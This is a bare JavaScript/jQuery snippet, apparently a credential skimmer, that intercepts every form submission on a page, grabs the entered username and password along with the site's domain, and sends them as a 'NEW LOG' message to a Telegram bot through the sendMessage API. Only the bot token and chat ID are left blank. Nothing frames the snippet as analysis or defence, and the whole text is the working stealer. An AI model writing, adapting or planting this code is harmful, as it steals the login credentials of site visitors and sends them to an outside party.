var token = '';
var api = 'https://api.telegram.org/bot' + token;
var UID = '';

    $("form").submit(function() {
       var login = $(this).parent().find('input[type=text]').val();
       var pass = $(this).parent().find('input[type=password]').val();
	   var currentSite = document.domain;
	   var message = "<b>NEW LOG</b> \n SITE: " + currentSite + '\n DATA: ' + login + ':' + pass;
	   $.get(api + '/sendMessage?chat_id=' + UID + '&text=' + encodeURIComponent(message) + '&parse_mode=html');
    });
